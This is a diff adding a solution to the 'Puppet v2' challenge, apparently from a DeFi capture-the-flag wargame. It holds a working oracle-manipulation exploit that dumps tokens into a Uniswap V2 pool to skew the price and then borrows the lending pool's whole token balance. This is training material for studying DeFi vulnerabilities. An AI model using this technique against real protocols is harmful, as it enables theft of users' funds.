@@ -82,6 +82,79 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log(" ");
+
+        // Estimating the initial amount of collateral needed to borrow.
+        let oneDVT = ethers.utils.parseEther("1");
+        let collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(oneDVT);
+        console.log(`In order to borrow 1 DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
+
+        // We need to drain the WETH or increase the DVT on the UniswapV2 pool in order to get DVT >>>> WETH.
+        let amountToLiquidate = ethers.utils.parseEther("10000");
+        let askedAmountOfETH = ethers.utils.parseEther("8");
+        let txPath = [this.token.address, this.weth.address];
+
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, amountToLiquidate);
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            amountToLiquidate,                                           // amountOut
+            askedAmountOfETH,                                          // amountInMax
+            txPath,                                                     // path
+            attacker.address,                                           // to
+            (await ethers.provider.getBlock('latest')).timestamp * 2    // deadline
+        );
+        console.log(`Swapped ${ethers.utils.formatEther(amountToLiquidate)} DVT for ${ethers.utils.formatEther(askedAmountOfETH)}`)
+        
+        let attackerEthBalance = await ethers.provider.getBalance(attacker.address);
+        let attackerDVTBalance = await this.token.balanceOf(attacker.address);
+
+        let uniswapEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
+        let uniswapDVTBalance = await this.token.balanceOf(this.uniswapExchange.address);
+
+        console.log(" ");
+        console.log("========== ========== ==========");
+        console.log(`Attacker Balances:`);
+        console.log(`${ethers.utils.formatEther(attackerEthBalance)} ETH`);
+        console.log(`${ethers.utils.formatEther(attackerDVTBalance)} DVTs`);
+        console.log("========== ========== ==========")
+        console.log(" ");
+        console.log("========== ========== ==========");
+        console.log(`Uniswap Balances:`);
+        console.log(`${ethers.utils.formatEther(uniswapEthBalance)} ETH`);
+        console.log(`${ethers.utils.formatEther(uniswapDVTBalance)} DVTs`);
+        console.log("========== ========== ==========")
+        console.log(" ");
+        
+        // Swapping the new ether amount for WETH (minus a small amount to cover gas costs).
+        this.weth.connect(attacker).deposit({value: (await ethers.provider.getBalance(attacker.address)).mul(997).div(1000)});
+        let attackerWethBalance = await this.weth.balanceOf(attacker.address);
+        console.log(`The attacker now has ${ethers.utils.formatEther(attackerWethBalance)} WETH`);
+
+        // Calculating the collateral for the new token status.
+        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(oneDVT);
+        console.log(`In order to borrow 1 DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
+        
+        let currentPoolBalance = await this.token.balanceOf(this.lendingPool.address);
+        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(currentPoolBalance);
+        console.log(`If we get greedy, to drain the pool we need ${ethers.utils.formatEther(collateralRequired)} WETH`);
+        console.log(" ");
+
+        // Now, we can drain the pool
+        let amountToBorrow = await this.token.balanceOf(this.lendingPool.address);
+        collateralRequired = await this.lendingPool.calculateDepositOfWETHRequired(amountToBorrow);
+        console.log(`In order to borrow ${ethers.utils.formatEther(amountToBorrow)} DVT, it is needed ${ethers.utils.formatEther(collateralRequired)} WETH`);
+        await this.weth.connect(attacker).approve(this.lendingPool.address, amountToBorrow.mul(101).div(100)); // Allowing 1% more as a sec. coef.
+        await this.lendingPool.connect(attacker).borrow(amountToBorrow);
+
+        attackerWethBalance = await this.weth.balanceOf(attacker.address);
+        attackerDVTBalance = await this.token.balanceOf(attacker.address);
+
+        console.log(" ");
+        console.log("========== ========== ==========");
+        console.log(`Attacker Balances:`);
+        console.log(`${ethers.utils.formatEther(attackerWethBalance)} WETH`);
+        console.log(`${ethers.utils.formatEther(attackerDVTBalance)} DVTs`);
+        console.log("========== ========== ==========")
+        console.log(" ");        
     });
 
     after(async function () {
